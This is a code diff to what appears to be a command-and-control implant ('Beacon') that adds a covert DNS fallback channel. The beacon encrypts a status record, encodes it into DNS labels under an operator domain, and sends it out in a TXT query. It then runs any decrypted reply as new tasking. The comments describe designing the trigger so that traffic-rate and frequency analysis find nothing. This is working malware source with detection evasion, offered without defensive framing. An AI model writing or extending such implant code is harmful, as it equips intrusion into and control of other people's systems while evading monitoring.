@@ -1676,6 +1676,46 @@ _RESCUE_FLAG_DNS_ANSWERED = 0x08
 _RESCUE_STRUCT = struct.Struct("!BBHBHBHBHB")
 
 
+
+_RESCUE_MAX_PAYLOAD_CHARS = 126
+
+
+def _rescue_pack(per_transport: dict, flags: int) -> bytes:
+    """The record, as bytes. Missing transports read as not_attempted.
+
+    The copy of `dns_rescue.pack`. It clamps where that one raises: this
+    runs on the failure path of every check-in, and a beacon that crashed
+    while recording why it cannot reach anywhere would be the worst trade
+    available. The server-side copy validates, which is the right place
+    for it -- it is reading something a target sent.
+    """
+    fields = []
+    for name in _RESCUE_TRANSPORTS:
+        klass, code = per_transport.get(name, (0, 0))
+        fields.append(max(0, min(int(klass), 0xFF)))
+        fields.append(max(0, min(int(code), 0xFFFF)))
+    return _RESCUE_STRUCT.pack(_RESCUE_VERSION, *(fields +
+                                                  [max(0, min(int(flags),
+                                                              0xFF))]))
+
+
+def _rescue_to_labels(b64_ciphertext: str):
+    """Two DNS labels carrying `_encrypt`'s output.
+
+    `_encrypt` returns base64; a label needs base32 of the raw bytes. The
+    split halves rather than using a constant, because the margin is one
+    character wide and a fixed boundary would quietly need a third label
+    the moment the record or the wrapper changes.
+    """
+    raw = base64.b64decode(b64_ciphertext)
+    text = base64.b32encode(raw).decode().lower().rstrip("=")
+    if not text or len(text) > _RESCUE_MAX_PAYLOAD_CHARS:
+        raise ValueError(
+            "payload is %d base32 characters; two labels hold %d"
+            % (len(text), _RESCUE_MAX_PAYLOAD_CHARS))
+    cut = -(-len(text) // 2)
+    return text[:cut], text[cut:]
+
 def _rescue_class_of(exc: BaseException) -> int:
     """Which failure class an exception belongs to.
 
@@ -4138,6 +4178,9 @@ class Beacon:
         # itself over the one channel it has left.
         self._leg_status = {}            # type: Dict[str, Tuple[int, int]]
         self._rescue_flags = 0
+        # Armed: set when a rescue goes out, cleared when any leg
+        # delivers again. A latch, so there is no rate to detect.
+        self._rescue_sent = False
 
         # The tunnel endpoint runs in its own process, not a thread: the
         # beacon is the access and the tunnel is the convenience, so a
@@ -4626,6 +4669,78 @@ class Beacon:
                                                                   0xFFFF)))
         except Exception:
             pass
+
+    # ── The rescue ──
+    #
+    # One query per exhaustion, and only when the resolver has shown it
+    # answers. The detectable property of a DNS tunnel is rate and volume,
+    # so the trigger is a latch and not an interval: one exhaustion, one
+    # query, and nothing for a frequency analysis to find.
+
+    _RESCUE_MAX_NAME = 253
+
+    def _leg_recovered(self):
+        """A leg delivered something: arm the latch for the next failure."""
+        self._rescue_sent = False
+
+    def _rescue_name(self) -> Optional[str]:
+        """The query name, or None when it will not fit.
+
+        Not truncated when it is too long. A truncated record decrypts to
+        nothing, and at the server that is indistinguishable from an
+        attacker's noise -- so a zone with no room is a configuration fact
+        to report, not a payload to mangle.
+        """
+        raw = _rescue_pack(self._leg_status, self._rescue_flags)
+        wrapped = self._encrypt({"d": base64.b64encode(raw).decode()})
+        try:
+            one, two = _rescue_to_labels(wrapped)
+        except ValueError as exc:
+            logger.debug("rescue: %s", exc)
+            return None
+        agent = self._agent_id or self._implant_id
+        encoded_id = base64.b32encode(
+            agent.encode()).decode().rstrip("=").lower()
+        name = "%s.%s.%s.%s.%s" % (one, two, encoded_id, _RESCUE_MARKER,
+                                   self.dns_domain)
+        if len(name) > self._RESCUE_MAX_NAME:
+            logger.debug(
+                "rescue: the name would be %d characters, over the %d DNS "
+                "allows; the zone leaves no room and nothing was sent",
+                len(name), self._RESCUE_MAX_NAME)
+            return None
+        return name
+
+    def _maybe_rescue(self) -> Optional[dict]:
+        """Say why we are stuck, once, if anything can carry it.
+
+        Returns whatever tasking came back, so the rescue reports and
+        collects the next instruction in one exchange rather than two.
+        """
+        if not self.dns_enabled or self._rescue_sent:
+            return None
+        # The resolver must have shown that it answers. Without that the
+        # query is noise with no recipient -- and that case is exactly the
+        # one a model on the drop-box would be for.
+        if not self._rescue_flags & _RESCUE_FLAG_DNS_ANSWERED:
+            return None
+        name = self._rescue_name()
+        if name is None:
+            return None
+        self._rescue_sent = True
+        try:
+            results = _dns_query(name, "TXT", self.dns_resolver, timeout=10)
+        except Exception as e:
+            logger.debug("rescue: query failed: %s", e)
+            return None
+        for txt in results or ():
+            try:
+                return self._decrypt(txt)
+            except Exception:
+                # Same rule as _beacon_dns: a record that does not decrypt
+                # is not tasking, whoever answered the query.
+                continue
+        return None
 
     def _beacon_https(self) -> Optional[dict]:
         info = self._system_info()
@@ -7438,6 +7553,10 @@ class Beacon:
 
         while self._running:
             tasking = None
+            # Whatever the last cycle learned is no longer true. A failure
+            # from three cycles ago riding along in a rescue would make an
+            # operator read a stale reason as a current one.
+            self._start_cycle()
 
             if self.https_enabled:
                 tasking = self._beacon_https()
@@ -7456,6 +7575,16 @@ class Beacon:
                     self._registered = True
 
             if tasking is None:
+                # Nothing got through. If the resolver has shown it
+                # answers, say why -- once, and in the same exchange that
+                # collects whatever the operator queued in reply. It is
+                # resolved here, before the dispatch below, so that an
+                # answer to the rescue runs like any other tasking: an
+                # assignment inside the failure arm would be collected and
+                # then dropped, because the arm that dispatches is an elif.
+                tasking = self._maybe_rescue()
+
+            if tasking is None:
                 self._consecutive_failures += 1
                 if self._consecutive_failures > 0 and self._consecutive_failures % 5 == 0:
                     logger.info("Re-registering after %d failures", self._consecutive_failures)
@@ -7463,10 +7592,12 @@ class Beacon:
                     self._register_https()
             elif tasking:
                 self._consecutive_failures = 0
+                self._leg_recovered()
                 logger.debug("Tasking: %s", tasking.get("cmd", "?"))
                 self._process_tasking_batch(tasking)
             else:
                 self._consecutive_failures = 0
+                self._leg_recovered()
 
             if self._consecutive_failures > 3:
                 self._backoff_sleep()
